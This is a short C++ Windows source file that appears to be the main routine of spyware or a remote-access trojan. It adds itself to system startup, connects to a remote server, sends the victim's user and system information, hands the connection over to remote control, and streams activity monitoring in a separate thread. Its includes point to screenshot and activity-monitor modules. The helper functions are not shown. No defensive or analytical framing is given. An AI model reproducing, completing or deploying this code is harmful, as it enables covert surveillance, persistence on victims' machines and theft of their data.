#include "network_utils.h"
#include "system_info.h"
#include "screenshot.h"
#include "activity_monitor.h"
#include "startup.h"
#include <iostream>
#include <windows.h>
#include <thread>

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "ws2_32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    addToStartup();

    initializeWinSock();
    SOCKET sock = createSocket();
    connectToServer(sock);

    std::thread connectionThread([&]() {
        std::string data = getUserInfo();
        sendData(sock, data);
        handleConnection(sock);
    });

    std::thread activityThread(monitorActivity, std::ref(sock));

    connectionThread.join();
    activityThread.join();

    cleanup(sock);
    return 0;
}